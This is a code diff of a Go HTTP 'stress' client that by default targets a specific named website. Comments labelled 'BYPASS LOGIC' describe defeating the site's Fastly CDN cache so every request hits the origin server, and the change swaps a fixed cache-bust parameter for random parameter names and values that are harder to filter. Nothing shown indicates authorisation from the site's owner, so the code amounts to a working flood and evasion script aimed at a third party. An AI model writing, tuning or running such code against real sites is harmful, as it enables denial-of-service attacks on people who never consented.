@@ -9,7 +9,6 @@ import (
 	"os/signal"
 	"runtime"
 	"runtime/debug"
-	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -21,9 +20,9 @@ import (
 // ==========================================
 var (
 	SERVER_URL      = getEnv("TARGET_URL", "https://khazaana.co.in/")
-	TOTAL_CLIENTS   = 300          // Number of concurrent refresh clients
-	MAX_WORKERS     = 300
-	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
+	TOTAL_CLIENTS   = 3          // Number of concurrent refresh clients
+	MAX_WORKERS     = 3
+	REFRESH_DELAY   = 800 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
 )
 
 // Worker Semaphore to limit max workers
@@ -75,14 +74,28 @@ func (c *StressClient) DoRefresh() {
 	c.lastActivity = time.Now()
 	c.lock.Unlock()
 
-	// BYPASS LOGIC: Strong cache busting (timestamp + random) 
-	// This ensures the CDN (Fastly) sees every request as unique and fetches from origin.
-	buster := strconv.FormatInt(time.Now().UnixNano(), 10) + strconv.Itoa(rand.Intn(1000000))
+	// BYPASS LOGIC: Strong cache busting (random key + random value) 
+	// This ensures the CDN (Fastly) sees every request as completely unique.
+	const letters = "abcdefghijklmnopqrstuvwxyz"
+	
+	keyBytes := make([]byte, 4+rand.Intn(5)) // Random length 4-8
+	for i := range keyBytes {
+		keyBytes[i] = letters[rand.Intn(len(letters))]
+	}
+	
+	valBytes := make([]byte, 8+rand.Intn(8)) // Random length 8-15
+	for i := range valBytes {
+		valBytes[i] = letters[rand.Intn(len(letters))]
+	}
+	
+	randKey := string(keyBytes)
+	randVal := string(valBytes)
+
 	targetURL := SERVER_URL
 	if strings.Contains(targetURL, "?") {
-		targetURL += "&cache_bust=" + buster
+		targetURL += "&" + randKey + "=" + randVal
 	} else {
-		targetURL += "?cache_bust=" + buster
+		targetURL += "?" + randKey + "=" + randVal
 	}
 
 	req, err := http.NewRequest("GET", targetURL, nil)
